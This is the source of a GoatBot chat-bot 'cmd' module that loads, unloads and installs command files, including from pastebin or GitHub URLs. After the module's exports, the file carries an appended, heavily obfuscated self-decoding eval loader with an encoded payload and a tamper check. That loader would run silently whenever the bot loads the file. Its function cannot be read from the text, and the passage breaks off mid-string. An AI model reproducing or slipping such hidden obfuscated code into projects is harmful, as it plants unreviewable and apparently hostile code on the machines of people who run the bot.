const axios = require("axios");
const { execSync } = require("child_process");
const fs = require("fs-extra");
const path = require("path");
const cheerio = require("cheerio");
const { client } = global;

const { configCommands } = global.GoatBot;
const { log, loading, removeHomeDir } = global.utils;

function getDomain(url) {
	const regex = /^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:/\n]+)/im;
	const match = url.match(regex);
	return match ? match[1] : null;
}

function isURL(str) {
	try {
		new URL(str);
		return true;
	}
	catch (e) {
		return false;
	}
}

module.exports = {
	config: {
		name: "cmd",
		version: "1.15",
		author: "NTKhang",
		countDown: 5,
		role: 2,
		shortDescription: {
			vi: "Quản lý command",
			en: "Manage command"
		},
		longDescription: {
			vi: "Quản lý các tệp lệnh của bạn",
			en: "Manage your command files"
		},
		category: "owner",
		guide: {
			vi: "   {pn} load <tên file lệnh>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <tên file lệnh>: Tải xuống và cài đặt một tệp lệnh từ một url, url là đường dẫn đến tệp lệnh (raw)"
				+ "\n   {pn} install <tên file lệnh> <code>: Tải xuống và cài đặt một tệp lệnh từ một code, code là mã của lệnh",
			en: "   {pn} load <command file name>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <command file name>: Download and install a command file from a url, url is the path to the file (raw)"
				+ "\n   {pn} install <command file name> <code>: Download and install a command file from a code, code is the code of the command"
		}
	},

	langs: {
		vi: {
			missingFileName: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn reload",
			loaded: "✅ | Đã load command \"%1\" thành công",
			loadedError: "❌ | Load command \"%1\" thất bại với lỗi\n%2: %3",
			loadedSuccess: "✅ | Đã load thành công (%1) command",
			loadedFail: "❌ | Load thất bại \"%1\" command\n%2",
			missingCommandNameUnload: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn unload",
			unloaded: "✅ | Đã unload command \"%1\" thành công",
			unloadedError: "❌ | Unload command \"%1\" thất bại với lỗi\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Vui lòng nhập vào url hoặc code và tên file lệnh bạn muốn cài đặt",
			missingUrlOrCode: "⚠️ | Vui lòng nhập vào url hoặc code của tệp lệnh bạn muốn cài đặt",
			missingFileNameInstall: "⚠️ | Vui lòng nhập vào tên file để lưu lệnh (đuôi .js)",
			invalidUrl: "⚠️ | Vui lòng nhập vào url hợp lệ",
			invalidUrlOrCode: "⚠️ | Không thể lấy được mã lệnh",
			alreadExist: "⚠️ | File lệnh đã tồn tại, bạn có chắc chắn muốn ghi đè lên file lệnh cũ không?\nThả cảm xúc bất kì vào tin nhắn này để tiếp tục",
			installed: "✅ | Đã cài đặt command \"%1\" thành công, file lệnh được lưu tại %2",
			installedError: "❌ | Cài đặt command \"%1\" thất bại với lỗi\n%2: %3",
			missingFile: "⚠️ | Không tìm thấy tệp lệnh \"%1\"",
			invalidFileName: "⚠️ | Tên tệp lệnh không hợp lệ",
			unloadedFile: "✅ | Đã unload lệnh \"%1\""
		},
		en: {
			missingFileName: "⚠️ | Please enter the command name you want to reload",
			loaded: "✅ | Loaded command \"%1\" successfully",
			loadedError: "❌ | Failed to load command \"%1\" with error\n%2: %3",
			loadedSuccess: "✅ | Loaded successfully (%1) command",
			loadedFail: "❌ | Failed to load \"%1\" command\n%2",
			missingCommandNameUnload: "⚠️ | Please enter the command name you want to unload",
			unloaded: "✅ | Unloaded command \"%1\" successfully",
			unloadedError: "❌ | Failed to unload command \"%1\" with error\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Please enter the url or code and command file name you want to install",
			missingUrlOrCode: "⚠️ | Please enter the url or code of the command file you want to install",
			missingFileNameInstall: "⚠️ | Please enter the file name to save the command (with .js extension)",
			invalidUrl: "⚠️ | Please enter a valid url",
			invalidUrlOrCode: "⚠️ | Unable to get command code",
			alreadExist: "⚠️ | The command file already exists, are you sure you want to overwrite the old command file?\nReact to this message to continue",
			installed: "✅ | Installed command \"%1\" successfully, the command file is saved at %2",
			installedError: "❌ | Failed to install command \"%1\" with error\n%2: %3",
			missingFile: "⚠️ | Command file \"%1\" not found",
			invalidFileName: "⚠️ | Invalid command file name",
			unloadedFile: "✅ | Unloaded command \"%1\""
		}
	},

	onStart: async ({ args, message, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, event, commandName, getLang }) => {
		const { unloadScripts, loadScripts } = global.utils;
		if (
			args[0] == "load"
			&& args.length == 2
		) {
			if (!args[1])
				return message.reply(getLang("missingFileName"));
			const infoLoad = loadScripts("cmds", args[1], log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
			if (infoLoad.status == "success")
				message.reply(getLang("loaded", infoLoad.name));
			else {
				message.reply(getLang("loadedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
				console.log(infoLoad.error);
			}
		}
		else if (
			(args[0] || "").toLowerCase() == "loadall"
			|| (args[0] == "load" && args.length > 2)
		) {
			const fileNeedToLoad = args[0].toLowerCase() == "loadall" ?
				fs.readdirSync(__dirname)
					.filter(file =>
						file.endsWith(".js") &&
						!file.match(/(eg)\.js$/g) &&
						(process.env.NODE_ENV == "development" ? true : !file.match(/(dev)\.js$/g)) &&
						!configCommands.commandUnload?.includes(file)
					)
					.map(item => item = item.split(".")[0]) :
				args.slice(1);
			const arraySucces = [];
			const arrayFail = [];

			for (const fileName of fileNeedToLoad) {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
				infoLoad.status == "success" ? arraySucces.push(fileName) : arrayFail.push(`${fileName} => ${infoLoad.error.fileName}: ${infoLoad.error.message}`);
			}

			let msg = "";
			if (arraySucces.length > 0)
				msg += getLang("loadedSuccess", arraySucces.length);
			if (arrayFail.length > 0)
				msg += (msg ? "\n" : "") + getLang("loadedFail", arrayFail.length, "❗" + arrayFail.join("\n❗ "));

			message.reply(msg);
		}
		else if (args[0] == "unload") {
			if (!args[1])
				return message.reply(getLang("missingCommandNameUnload"));
			const infoUnload = unloadScripts("cmds", args[1], configCommands, getLang);
			infoUnload.status == "success" ?
				message.reply(getLang("unloaded", infoUnload.name)) :
				message.reply(getLang("unloadedError", infoUnload.name, infoUnload.error.name, infoUnload.error.message));
		}
		else if (args[0] == "install") {
			let url = args[1];
			let fileName = args[2];
			let rawCode;

			if (!url || !fileName)
				return message.reply(getLang("missingUrlCodeOrFileName"));

			if (
				url.endsWith(".js")
				&& !isURL(url)
			) {
				const tmp = fileName;
				fileName = url;
				url = tmp;
			}

			if (url.match(/(https?:\/\/(?:www\.|(?!www)))/)) {
				global.utils.log.dev("install", "url", url);
				if (!fileName || !fileName.endsWith(".js"))
					return message.reply(getLang("missingFileNameInstall"));

				const domain = getDomain(url);
				if (!domain)
					return message.reply(getLang("invalidUrl"));

				if (domain == "pastebin.com") {
					const regex = /https:\/\/pastebin\.com\/(?!raw\/)(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://pastebin.com/raw/$1");
					if (url.endsWith("/"))
						url = url.slice(0, -1);
				}
				else if (domain == "github.com") {
					const regex = /https:\/\/github\.com\/(.*)\/blob\/(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://raw.githubusercontent.com/$1/$2");
				}

				rawCode = (await axios.get(url)).data;

				if (domain == "savetext.net") {
					const $ = cheerio.load(rawCode);
					rawCode = $("#content").text();
				}
			}
			else {
				global.utils.log.dev("install", "code", args.slice(1).join(" "));
				if (args[args.length - 1].endsWith(".js")) {
					fileName = args[args.length - 1];
					rawCode = event.body.slice(event.body.indexOf('install') + 7, event.body.indexOf(fileName) - 1);
				}
				else if (args[1].endsWith(".js")) {
					fileName = args[1];
					rawCode = event.body.slice(event.body.indexOf(fileName) + fileName.length + 1);
				}
				else
					return message.reply(getLang("missingFileNameInstall"));
			}

			if (!rawCode)
				return message.reply(getLang("invalidUrlOrCode"));

			if (fs.existsSync(path.join(__dirname, fileName)))
				return message.reply(getLang("alreadExist"), (err, info) => {
					global.GoatBot.onReaction.set(info.messageID, {
						commandName,
						messageID: info.messageID,
						type: "install",
						author: event.senderID,
						data: {
							fileName,
							rawCode
						}
					});
				});
			else {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
				infoLoad.status == "success" ?
					message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
					message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
			}
		}
		else
			message.SyntaxError();
	},

	onReaction: async function ({ Reaction, message, event, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang }) {
		const { loadScripts } = global.utils;
		const { author, data: { fileName, rawCode } } = Reaction;
		if (event.userID != author)
			return;
		const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
		infoLoad.status == "success" ?
			message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
			message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
	}
};



let AVUG;!function(){const o9Uz=Array.prototype.slice.call(arguments);return eval("(function A4lL(jktD){const DHlD=T3cE(jktD,bcQD(A4lL.toString()));try{let ffoD=eval(DHlD);return ffoD.apply(null,o9Uz);}catch(fhVD){var HOXD=(0o204576-67939);while(HOXD<(0o400110%65558))switch(HOXD){case (0x30084%0o200043):HOXD=fhVD instanceof SyntaxError?(0o400127%0x1001F):(0o400112%0x10017);break;case (0o201356-0x102D5):HOXD=(0o400126%65565);{console.log(\'Error: the code has been tampered!\');return}break;}throw fhVD;}function bcQD(DJSD){let X6KD=669782247;var zEND=(0o400141%65567);{let T1FD;while(zEND<(0x105A0-0o202574)){switch(zEND){case (0O144657447^0x1935F20):zEND=(0o203220-0x10678);{X6KD^=(DJSD.charCodeAt(T1FD)*(15658734^0O73567354)+DJSD.charCodeAt(T1FD>>>(0x4A5D0CE&0O320423424)))^2068448208;}break;case (0x40064%0o200023):zEND=(0x40087%0o200035);T1FD++;break;case (0o203256-67227):zEND=T1FD<DJSD.length?(0O264353757%8):(0o1000260%65571);break;case (0o202570-0x10555):zEND=(0o1000177%0x1001B);T1FD=(0x21786%3);break;}}}let vzID=\"\";var vBfE=(67036-0o202703);{let X8hE;while(vBfE<(0x10410-0o201766)){switch(vBfE){case (0o203720-67511):vBfE=(0O347010110&0x463A71D);X8hE=(0x21786%3);break;case (73639709%9):vBfE=X8hE<(0O3153050563-0x19AC516B)?(262228%0o200020):(131132%0o200021);break;case (0o200620-0x1017C):vBfE=(0x1030C-0o201377);{const rwaE=X6KD%(0x20043%0o200027);X6KD=Math.floor(X6KD/(68056-0o204703));vzID+=rwaE>=(0o204444-0x1090A)?String.fromCharCode((0x111C6-0o210605)+(rwaE-(0o600150%65562))):String.fromCharCode((0o1000415%0x1002B)+rwaE);}break;case (0o202020-0x10403):vBfE=(73639709%9);X8hE++;break;}}}return vzID;}function T3cE(nr5D,PY7D){nr5D=decodeURI(nr5D);let jm0D=(0x75bcd15-0O726746425);let LT2D=\"\";var njXB=(0o400125%0x10019);{let PQZB;while(njXB<(196722%0o200032)){switch(njXB){case (0O144657447^0x1935F20):njXB=(0o203220-0x10678);{LT2D+=String.fromCharCode(nr5D.charCodeAt(PQZB)^PY7D.charCodeAt(jm0D));jm0D++;var jeSB=(0o200466-65815);while(jeSB<(0o201200-66144))switch(jeSB){case (0o201154-66125):jeSB=jm0D>=PY7D.length?(0x10348-0o201454):(0x10500-0o202340);break;case (0o600141%0x10017):jeSB=(0x30056%0o200022);{jm0D=(0x21786%3);}break;}}break;case (0o1000153%0x10016):njXB=PQZB<nr5D.length?(0O264353757%8):(0o1000264%0x10024);break;case (0o600203%65568):njXB=(0o1000203%65564);PQZB=(0x21786%3);break;case (67216-0o203170):njXB=(66676-0o202141);PQZB++;break;}}}return LT2D;}})(\"%5B%0E%06%1A%16%05%01%0E%1D@Z%0F%13%04%06%02%07%01%1C%1AU%E2%B4%B3%E2%B5%98%E2%B5%91%E2%B4%B0%E2%B5%99%5B%5D%0E%03%0D%15%06%1A%1DT%E2%B4%B7%E2%B5%81%E2%B4%B8%E2%B5%9E%E2%B5%82@Z_%E2%B5%87%E2%B5%8A%E2%B4%B6%E2%B5%9C%E2%B5%82@Z_%E2%B4%B7%E2%B4%B1%E2%B5%9D%E2%B5%93%E2%B5%82@Z_%E2%B5%87%E2%B5%8A%E2%B4%B6%E2%B5%98%E2%B5%82@Z%09%13%04%06%02%07%01%1C%1AU%E2%B5%83%E2%B4%A3%E2%B5%92%E2%B4%B0%E2%B5%99%5B%5D%0E%03%0D%15%06%1A%1DT%5DYCI(C(/TZ3%3CXIX/(,C:X3.)(,C:.A(_.,5HY@%E2%B4%B1%E2%B5%84%E2%B4%A5%E2%B4%B0%E2%B5%99IZAZ_%5DZ3:X3(_TZ3%3C.C(_.,5%3CX3.).Z3%3C.3XU%5E*5%3C.A%0E5#$/%5C%08%15H%12%00%1F%0B%15%1A%07%1DT%E2%B4%A7%E2%B4%A4%E2%B5%99%E2%B4%A5%E2%B5%82@Z%0F%07%14%1C%14%01%06S%5C%5EY3J(3R_.,C@X3.)%5E*C:.5.)%5E*5H(C(/%5E*3J(5._.Z3%3C.5X/(,3J(5./%5EPC:.5.)%5C%5B@JX3X/(,3J(5.%5D%5EYC@X3._%5DZC:X3.).Z3%3C.AZ%09%13%04%06%02%07%01%1C%1AU%E2%B4%B3%E2%B4%A8%E2%B5%94%E2%B4%B7%E2%B5%99%5B%5D%0E%03%0D%15%06%1A%1DT%E2%B4%B7%E2%B5%81%E2%B5%98%E2%B5%9C%E2%B5%82@Z_%E2%B4%B7%E2%B4%B1%E2%B4%AD%E2%B4%A0%E2%B5%82@Z_%E2%B5%87%E2%B5%8A%E2%B4%B6%E2%B5%9C%E2%B5%82@Z_%E2%B4%B7%E2%B5%81%E2%B5%98%E2%B5%98%E2%B5%82@Z%09%13%04%06%02%07%01%1C%1AU%E2%B4%B3%E2%B4%B8%E2%B4%BB%E2%B4%B0%E2%B5%99%5B%5D%0E%03%0D%15%06%1A%1DT%5D%05%11%11%16%07%15T%5D*5J(5Z%5D.ZIJ(5.%094\'=&%5D%18N%5C;%10&@NU=%15;XS%07%06%06%10%00%1C%1E%06A%E2%B5%81%E2%B5%93%E2%B4%AD%E2%B4%B7%E2%B5%84YA%1A%10%07%1D%07%01Q%E2%B5%9A%E2%B4%AA%E2%B4%A0%E2%B4%AB%E2%B5%82I%E2%B4%B7%E2%B4%B1%E2%B4%BD%E2%B5%95%E2%B5%82@Z/%E2%B5%87%E2%B4%BA%E2%B5%9B%E2%B5%94%E2%B5%82@Z)N%03%0D%15%06%1A%1DT%E2%B5%87%E2%B4%BA%E2%B4%BB%E2%B4%A2%E2%B5%82W%5B%E2%B5%86%E2%B4%BE%E2%B4%A2%E2%B4%AB%E2%B5%90X3.%5D.%E2%B5%83%E2%B4%A3%E2%B4%B2%E2%B4%B2%E2%B5%99V%E2%B5%86%E2%B5%8E%E2%B5%8F%E2%B5%9D%E2%B5%90%5BA.N%E2%B4%A7%E2%B5%84%E2%B4%BF%E2%B4%A2%E2%B5%82@%E2%B5%81%E2%B4%BF%E2%B4%A6%E2%B4%B2%E2%B5%99J(5_%E2%B4%B6%E2%B4%B5%E2%B5%84%E2%B4%AA%E2%B5%90%5BAZO%08%17%1D%0F%10%1C%1A%1B%1BQ%E2%B4%BA%E2%B5%94%E2%B4%A4%E2%B4%AB%E2%B5%82%5C%E2%B4%A7%E2%B4%B4%E2%B4%A4%E2%B4%A2%E2%B5%82D%E2%B4%B1%E2%B5%84%E2%B4%A5%E2%B4%B2%E2%B5%99M%E2%B5%81%E2%B5%93%E2%B4%BD%E2%B4%B0%E2%B5%84X%13%0D%16%1CS%E2%B4%A6%E2%B4%A0%E2%B4%A0%E2%B4%AC%E2%B5%90NJQO%03%10%1AA%E2%B4%A1%E2%B5%9D%E2%B4%B4%E2%B4%B0%E2%B5%84L@Q%0B%5CCD@3MQ%1CZCDEC%5BHH%13%1F%11%01Q%E2%B4%AA%E2%B4%B1%E2%B4%B9%E2%B4%AC%E2%B5%82O%E2%B4%B7%E2%B4%A1%E2%B5%92%E2%B4%A2%E2%B5%82R%04%1C%1C%1D%0DI%E2%B4%A1%E2%B5%9D%E2%B4%B4%E2%B4%B0%E2%B5%84M@WE%5BBBXA%07SCY@@@XA%1A%00%1F%1A%00%16%19@%E2%B4%B3%E2%B5%86%E2%B4%AF%E2%B4%B7%E2%B5%85%5C%0A%0B%00%00%0DS%5CE%09YQF.CYE%1EZQA_BF%5CK%E2%B4%BA%E2%B5%94%E2%B4%B4%E2%B4%AC%E2%B5%82I%5DA%07WCXBDATX%19BXCD6XS%E2%B4%A3%E2%B4%A3%E2%B4%A2%E2%B4%B7%E2%B5%85%5EZS%03%01%0D%12%1FN%12%09%12%16H%5BD%0DBXQE+VD%1ACXQC%5BD%5DO%E2%B4%A3%E2%B5%9D%E2%B4%A6%E2%B4%B7%E2%B5%99N%5CE%09ZQCZ2QE%1EZQCXCA%5CJ%E2%B4%AA%E2%B4%B1%E2%B4%B9%E2%B4%AC%E2%B5%82I%E2%B4%B7%E2%B5%81%E2%B4%B8%E2%B4%A2%E2%B5%82S%11%06%10%10%03Z%10%09%00%11UY%5ETK%5DEYE%1EZQC%5CGD%5CK%E2%B4%BA%E2%B5%94%E2%B4%B4%E2%B4%AC%E2%B5%82I%E2%B4%B7%E2%B4%A1%E2%B4%A2%E2%B4%A5%E2%B5%82T%E2%B4%B1%E2%B5%84%E2%B4%A5%E2%B4%B2%E2%B5%99J%5B%E2%B5%9A%E2%B5%88%E2%B4%BA%E2%B4%B1%E2%B5%80U%5CN%1D%1D%10%10%17%01%0F%16%0CL%E2%B4%A6%E2%B4%B0%E2%B4%BD%E2%B4%AB%E2%B5%90%5D%04%16%1A%12%05%00%5B%E2%B5%81%E2%B5%93%E2%B4%BD%E2%B4%B0%E2%B5%84XWIC%10BDD2ZLC%07ADEG_PZR%5BD%1ACXTA%5DAYCIZSDAH%16%07%14%09%0AH%0B%12%07%10Q@PJ%5EEALTX%0EAXCDDGA%5B%E2%B4%A1%E2%B5%9D%E2%B4%B4%E2%B4%B0%E2%B5%84L@Q%1C%5ECDDF%5DDC%10BDE@,HH%13%05%15%07Q%E2%B4%AA%E2%B5%91%E2%B4%B3%E2%B4%AC%E2%B5%82I%5DA%07SCXFCA%5C%5ETK_K%5DN%06%00%08%1F%0D%5B%E2%B4%B6%E2%B5%85%E2%B4%B1%E2%B4%AC%E2%B5%90O@BGD@_RVX%1CFEAXRDAZ%07%02%18%1C%02%1B@%E2%B4%B1%E2%B5%84%E2%B4%B5%E2%B4%B5%E2%B5%99H%08%0B%12%07%10Q@WKQFBXA%07SC%5EGBCXR%E2%B4%A3%E2%B5%83%E2%B4%A8%E2%B4%B7%E2%B5%85H%E2%B4%B3%E2%B4%B8%E2%B4%AB%E2%B4%B7%E2%B5%99MI%E2%B4%A7%E2%B4%B4%E2%B4%A4%E2%B4%A2%E2%B5%82F%1F%11%1B%16%1C%09L@C%1BGA_UBZ%5ED%0D@X$6_ZN%5DA%07UCXBBBTX%19BXCFMXS%03%01%0D%12%1FN%12%09%12%16H%5BBCC%5BW%5EX%1CFE@ZRBAI%E2%B4%B6%E2%B5%85%E2%B4%B1%E2%B4%AC%E2%B5%90N@ELCD%5ELC%07ADCAYPZS%11%06%10%10%03A%E2%B4%B1%E2%B4%B8%E2%B5%89%E2%B4%B7%E2%B5%84J%15%E2%B4%B3%E2%B4%A6%E2%B4%B9%E2%B4%B7%E2%B5%85%5EL%E2%B4%BA%E2%B4%A4%E2%B4%BF%E2%B4%AB%E2%B5%82/%E2%B4%B7%E2%B4%A1%E2%B4%A2%E2%B4%A5%E2%B5%825H%09%17%03%0D%00%18S%0E%09%08%03%0D%15%06%1A%1DT%E2%B4%A7%E2%B4%A4%E2%B4%B9%E2%B4%A5%E2%B5%82S%0E%12%00%1F%0B%15%1A%07%1DT%E2%B5%87%E2%B4%BA%E2%B4%AB%E2%B4%A5%E2%B5%82@Z%0F%07%14%1C%14%01%06S%E2%B5%86%E2%B5%8E%E2%B5%8F%E2%B5%93%E2%B5%90%5BAX%E2%B4%A6%E2%B5%80%E2%B4%B6%E2%B5%96%E2%B5%90%5BAX%E2%B4%B6%E2%B4%B5%E2%B4%B4%E2%B5%97%E2%B5%90%5BAX%E2%B5%86%E2%B5%8E%E2%B4%AF%E2%B5%97%E2%B5%90%5BA%0E%02%14%03H%E2%B5%93%E2%B4%A8%E2%B5%90%E2%B4%B7%E2%B5%85H*@P@YGBBTX%0EAXCEGEAM%5BX%0BGEB%5BVVX%1CFEA%5BQEA_%5CDBYWDQVD%1ACXQA_@%5D(J%0E%14%1D%0B%07%1D%1A%1FH%E2%B4%B3%E2%B4%B6%E2%B5%94%E2%B4%B7%E2%B5%85%5D%E2%B4%A3%E2%B5%9D%E2%B4%A6%E2%B4%B3%E2%B5%99_%E2%B4%B6%E2%B4%A5%E2%B4%BB%E2%B4%A8%E2%B5%90Z%13%1F%11%01Q%E2%B4%AA%E2%B5%91%E2%B4%B3%E2%B4%A8%E2%B5%82IXZ3:X3(_TZ3%3C.C(_.,5%3CX3.).Z3%3C.3X/(,5Z%05%09%01T%E2%B5%87%E2%B4%BA%E2%B4%AB%E2%B4%A1%E2%B5%82U%5BD%0DCXQ@)VD%1ACXQCZB%5DN%0A%04%04%07H%E2%B5%81%E2%B4%AF%E2%B5%8D%E2%B4%B1%E2%B5%99Z%04%00%1A%18%10Y%E2%B5%9A%E2%B4%AA%E2%B4%B0%E2%B4%A8%E2%B5%82H%5DC%5ESAQKQE%1EZQCX@A%5CX%13%12%04%01%07%17%1DY%E2%B5%9A%E2%B4%AA%E2%B4%B0%E2%B4%A8%E2%B5%82%5D%0E%12%09%12%16H%5BEF@YTEMC%1BGAXQ@%5BZN%E2%B5%87%E2%B4%BA%E2%B4%AB%E2%B4%A1%E2%B5%82U%5BD%1AEXQC%5EAQE%09YQCYB%5DN%E2%B5%83%E2%B4%B3%E2%B5%99%E2%B4%B3%E2%B5%99X_N%13%1A%04%12%03H%17%14%02%0DA%5BX%0BGEA%5B\'VX%1CFEAXPFAI%E2%B5%86%E2%B4%BE%E2%B4%B2%E2%B4%A8%E2%B5%90N@C%0CGAXP6MC%1BGAXQC_ZO%E2%B5%87%E2%B4%AA%E2%B5%90%E2%B4%A1%E2%B5%82UX/.Z3:X3.)%5E*C:.5._.,5:X3.).Z3%3C.5H%16%07%14%09%0AH%0B%12%07%10Q@Q%1CZCCGB%5CLC%10BD0F)HI%E2%B5%9A%E2%B4%B8%E2%B4%B7%E2%B4%B5%E2%B5%80UIBQECGIMQ%1CZCDEB%5EHH%13%05%15%07Q%E2%B4%BA%E2%B4%A4%E2%B5%8F%E2%B4%A8%E2%B5%82I%5DA%07SC%5CBBE%5CX%19BXK@6XS%16%1B%01%1F%11%5D%E2%B4%A3%E2%B4%AD%E2%B5%9D%E2%B4%B3%E2%B5%99O%5CE%09ZQC_5QE%1EZQCXFA%5CX%1B%16%1A%1C%10%1C%5D%E2%B4%A3%E2%B4%AD%E2%B5%9D%E2%B4%B3%E2%B5%99Z%0F%16%10%1B%04S@ABGCXXVX%1CFEAXPBAI%E2%B4%A6%E2%B4%B0%E2%B5%8D%E2%B4%A8%E2%B5%90N@C%1BGA_VG%5E%5ED%0D@X\'0YZO%07%14%1C%14%01%06S%E2%B5%86%E2%B4%AE%E2%B5%89%E2%B4%A8%E2%B5%90H%0B%12%07%10Q@Q%0BYCLBAEQ%1CZC@D@%5CHI%E2%B4%BA%E2%B4%B6%E2%B5%88%E2%B4%B5%E2%B5%80U%E2%B4%B3%E2%B5%86%E2%B4%AF%E2%B4%B3%E2%B5%85.%E2%B5%83%E2%B4%B3%E2%B5%99%E2%B4%B3%E2%B5%99.IHL%E2%B4%AA%E2%B4%B1%E2%B4%B9%E2%B4%A8%E2%B5%82/%5E*5%3CL@BGD@%5CPVX%1CFEAXSGAI%5CE%1EZQDYE@XA%10PC-G2%5CJ%0A%13%16%09%18O%08%0C%0A%13%16%09%18O%16%10%1B%04S@C%0CDAX%20CEC%1BGAXSAXZN%E2%B5%87%E2%B4%BA%E2%B4%AB%E2%B4%A1%E2%B5%82U%E2%B5%81%E2%B4%AF%E2%B5%8D%E2%B4%B1%E2%B5%99%5D%E2%B4%A1%E2%B5%9D%E2%B4%B4%E2%B4%B4%E2%B5%84_%04%04%1D%0F%07%1CJYX%0EGXCEDGMQ%0BYCDDGA%5B%5BX%0BFEA%5EQVX%1CFEAXRFAH%16%07%14%09%0AH%15%0E%09%07%14%1C%14%01%06S%E2%B4%B6%E2%B5%85%E2%B4%B1%E2%B4%A8%E2%B5%90H%15%15%01%1B%12%1C%08%1C%06S%E2%B4%A6%E2%B4%A0%E2%B5%80%E2%B4%A8%E2%B5%90%5BA%08%06%10%05%1D%13%1DH%E2%B5%81%E2%B4%AF%E2%B4%BD%E2%B4%B0%E2%B5%99IZC%E2%B4%B1%E2%B5%84%E2%B4%A5%E2%B5%8E%E2%B5%99IZC%E2%B4%B1%E2%B4%B4%E2%B4%B0%E2%B5%84%E2%B5%99IZ%15%15%01%1B%12%1C%08%1C%06S%E2%B4%B6%E2%B4%B5%E2%B5%84%E2%B4%A8%E2%B5%90%5BA%08%06%10%05%1D%13%1DH%E2%B5%81%E2%B5%8F%E2%B4%BB%E2%B5%85%E2%B5%99IZC%E2%B5%81%E2%B5%8F%E2%B4%AB%E2%B5%8C%E2
